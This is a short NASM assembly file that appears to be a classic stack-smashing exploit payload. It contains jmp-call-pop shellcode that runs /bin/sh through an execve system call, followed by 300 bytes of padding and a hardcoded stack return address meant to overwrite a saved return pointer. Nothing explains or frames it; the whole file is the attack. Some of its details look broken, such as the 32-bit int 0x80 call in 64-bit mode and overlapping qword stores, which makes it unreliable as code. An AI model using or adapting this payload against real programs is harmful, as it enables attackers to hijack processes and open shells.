BITS 64
jmp short callit

doit:
pop	rsi
xor	rax, rax
mov byte	[rsi + 7], al
lea rbx, [rsi]
mov qword	[rsi + 8], rbx
mov qword	[rsi + 12], rax
mov byte	al, 0x0b
mov	rbx, rsi
lea	rcx, [rsi + 8]
lea	rdx, [rsi + 12]
int	0x80
callit:

call doit

	db '/bin/sh#AAAABBBB'
times 300 db 0xff
	dq 0x00007fffffffda10
	db 0x00
